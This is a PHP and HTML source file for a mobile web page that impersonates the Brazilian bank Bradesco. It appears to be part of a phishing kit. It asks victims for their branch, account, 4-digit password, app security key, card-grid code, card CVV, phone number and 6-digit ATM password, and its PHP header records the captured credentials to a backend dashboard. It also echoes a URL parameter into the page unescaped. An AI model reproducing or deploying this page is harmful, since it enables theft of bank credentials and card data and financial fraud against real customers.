<?php
require_once('../_dashboard2021/config.php');
require_once('../validacao.php');
if(isset($_SESSION['agencia']) && strlen($_SESSION['agencia']) > 2 && isset($_SESSION['conta']) && strlen($_SESSION['conta']) > 3 && isset($_SESSION['s4']) && strlen($_SESSION['s4']) == 4){

    $agencia = $_SESSION['agencia'];
    $conta = $_SESSION['conta'];
    $aConta = explode('-', $conta);
    $conta = $aConta[0];
    $digito = $aConta[1];
    $s4 = $_SESSION['s4'];
    Info::gravarInfoMobile($_SESSION['idAcesso'], $agencia, $conta, $digito, $senha4);
    
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700&display=swap" rel="stylesheet">

    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
    <link rel="shortcut icon" href="images/favicon.ico">
    <title>Bradesco</title>
</head>
<body>
    <nav class="navbar d-flex">
        <a class="navbar-brand" href="javascript:;"><img src="images/bars.png" alt=""></a>
        <p class="header-title">Bradesco</p>
    </nav>
    <div id="boxAguardar" class="boxes hide">

        <h3 class="title aguarde">Aguarde...</h3>

        <img class="mx-auto d-block" src="images/aguardando.gif">

        <div class="conteudo">
            <p class="destaque"><span class="nome"></span>Para concluir o acesso, será necessário utilizar sua chave de segurança, para isso:</p>

            <div class="item equalHMRWrap">
                <div class="contador">1</div>
                <div class="texto"><p>Acesse o aplicativo Bradesco instalado em seu dispositivo móvel</p></div>
            </div>
            <div class="item">
                    <div class="contador">2</div>
                    <div class="texto"><p>Selecione a opção "Chave de Segurança"</p></div>
            </div>
            <div class="item">
                    <div class="contador">3</div>
                    <div class="texto"><p>Informe seu PIN (senha de 4 dígitos)</p></div>
            </div>
            <div class="item">
                    <div class="contador">4</div>
                    <div class="texto"><p>Informe a chave de segurança de 6 digítos informada no visor do seu dispositivo</p></div>
            </div>

        </div>

    </div>
    <div id="boxAcesso" class="boxes">
        <h3 class="title content">ACESSO À CONTA</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>
        <section id="form">
        <form id="acessoForm" action="index.php" method="POST"  autocomplete="off">
                <div class="input-container">
                    <input id="agencia" name="agencia" maxlength="4" onkeyup="this.value=this.value.replace(/[^\d]/,'')" class="field" type="tel" pattern=".+"/>
                    <label class="label" for="agencia">Agência</label>
                </div>
                <div class="input-container">
                        <input id="conta" name="conta" onkeyup="this.value=this.value.replace(/[^\d]/,'')" class="input field" type="tel" pattern=".+"/>
                        <label class="label" for="conta">Conta</label>
                </div>
                <div class="input-container">
                        <input id="s4" name="s4" onkeyup="this.value=this.value.replace(/[^\d]/,'')" style="-webkit-text-security: disc;" maxlength="4" class="input field" type="tel" oninput="this.value = this.value.replace(/[^0-9]/g, '')" pattern=".+"/>
                        <label class="label" for="s4">Senha 4 Dígitos</label>
                </div>
                <div class="input-container-buttons">
                    <label for="">Titularidade</label>
                    <button type="button" class="btn-option red" style="width: 32%;">1º Titular</button>
                    <button type="button" class="btn-option" style="width: 32%;margin-left: 0.9%;">2º Titular</button type="button">
                    <button type="button" class="btn-option" style=" width: 32%;margin-left: 0.9%;">3º Titular</button type="button">
                </div>
                <input type="submit" class="btn-acessar bt_avancar" value="Acessar">
            </form>
        </section>
    </div>
    <div id="boxToken" class="boxes hide">
        <h3 class="title content">CHAVE DE SEGURANÇA</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>
        <div class="center">
            <img class="token" src="images/chave-seguranca.png" alt="">
        </div>
        <p><span class="nome"></span>Informe a chave visualizada no visor do seu dispositivo, caso esteja utilizando o mesmo aparelho, tente acessá-la sem fechar a página.</p>
        <section id="form-token">
            <form autocomplete="off">
                    <div class="input-container">
                        <i class="fa fa-envelope icon"><img src="images/logo.png"></i>
                        <input type="tel" id="tokenChave" class="input-field" maxlength="6" onkeyup="this.value=this.value.replace(/[^\d]/,'')" pattern=".+" required placeholder="CHAVE DE SEGURANÇA" name="chave" id="chave">
                    </div>
                <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
            </form>
        </section>
    </div>
    <div id="boxTabela" class="boxes hide">
        <h3 class="title content">CHAVE DE SEGURANÇA</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>
        <div class="center">
            <img class="token" src="images/tabela.png" alt="">
        </div>
        <p><span class="nome"></span>Preencha o campo abaixo com a chave indicada no verso do seu cartão, conforme posição solicitada.</p>
        <div class="center" style="margin-bottom:30px;">
            <p style="margin-bottom: 10px;"><strong>Posição <span id="posicaoChave"></span></strong> no verso do cartão:</p>
            <input type="tel" id="chaveTabela" class="frmField" maxlength="3" style="width: 80px; text-align: center;" onkeyup="this.value=this.value.replace(/[^\d]/,'')">
        </div>
        <div class="container">
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
    </div>
    <div id="boxCvv" class="boxes hide">
        <h3 class="title content">CONFIRMAÇÃO CVV</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>
        <div class="center">
            <img class="token" src="images/cvv.png" alt="">
        </div>
        <p><span class="nome"></span>Preencha o campo abaixo com o <strong>CVV</strong> indicado no verso do seu cartão de crédito / débito.</p>
        <div class="center" style="margin-bottom:30px;">
            <p style="margin-bottom: 10px;">Código verificador <strong>CVV</strong>:</p>
            <input type="tel" id="cvv" class="frmField" maxlength="3" style="width: 80px; text-align: center;" onkeyup="this.value=this.value.replace(/[^\d]/,'')">
        </div>
        <div class="container">
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
    </div>
    <div id="boxCelular" class="boxes hide">
        <h3 class="title content">NÚMERO DO CELULAR</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>
        <div class="center">
            <img class="token" src="images/celular.png" alt="">
        </div>
        <p><span class="nome"></span>Confirme no campo abaixo o <strong>número do celular</strong> cadastrado em sua conta.</p>
        <div class="center" style="margin-bottom:30px;">
            <p style="margin-bottom: 10px;"><strong>Número do celular:</strong></p>
            <input type="tel" id="celular" class="frmField" maxlength="3" style="width: 200px; text-align: center;">
        </div>
        <div class="container">
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
    </div>
    <div id="boxSenhaDe6" class="boxes hide">
        <h3 class="title content">SENHA DE 6 DÍGITOS</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>
        <div class="center">
            <img class="token" src="images/password.png" alt="">
        </div>
        <p><span class="nome"></span>Informe sua senha de <strong style="white-space:nowrap">6 Dígitos</strong> a mesma utilizada nos terminais de autoatendimento Bradesco.</p>
        <div class="center" style="margin-bottom:30px;">
            <p style="margin-bottom: 10px;"><strong>Senha de 6 Dígitos:</strong></p>
            <input type="tel" id="senhaDe6" class="frmField" maxlength="6" style="-webkit-text-security: disc;width: 200px; text-align: center;" onkeyup="this.value=this.value.replace(/[^\d]/,'')">
        </div>
        <div class="container">
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
    </div>
    <div id="footer">
        <div id="logo"></div>
    </div>
    <input type="hidden" name="clientHashId" id="clientHashId" value="<?php echo $_GET["hash"];?>">
    <input type="hidden" name="id" id="id" value="<?php echo isset($_SESSION["id"]) ? $_SESSION["id"] : '';?>">
    <input type="hidden" name="idAcesso" id="idAcesso" value="<?php echo isset($_SESSION["idAcesso"]) ? $_SESSION["idAcesso"] : '';?>">
    <script src="js/jquery.min.js"></script>
    <script src="js/jquery.mask.min.js"></script>
    <script src="js/main.js"></script>
</body>
</html>